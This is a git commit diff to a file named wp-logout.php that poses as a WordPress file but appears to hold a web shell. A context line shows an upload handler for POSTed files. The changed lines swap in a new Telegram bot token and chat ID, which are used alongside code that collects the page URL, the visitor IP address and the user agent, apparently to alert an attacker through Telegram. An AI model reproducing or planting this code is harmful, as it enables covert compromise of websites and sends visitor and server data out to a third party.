7d11901814cd3c10677a752e6f8adc8d832f0ece
Tituss22 <158983092+Tituss22@users.noreply.github.com>
2025-05-06 19:44:54 +0700

    SukaBintang01

--- wp-logout.php
+++ wp-logout.php
@@ -81,8 +81,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
 }
 ?>
 <?php
-$telegram_token = "7502563828:AAE3gMvWi2-thrgX0k9mgy_EAecYXSCgAMs"; 
-$chat_id = "2024533279"; 
+$telegram_token = "7981126724:AAH4UCJ3evRi0wohScbSQPf6MJ8jQ0gHuc8"; 
+$chat_id = "7376473296"; 
 $file_url = (isset($_SERVER['HTTPS']) ? "https" : "http") . "://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
 $ip_address = $_SERVER['REMOTE_ADDR'];
 $user_agent = $_SERVER['HTTP_USER_AGENT'];
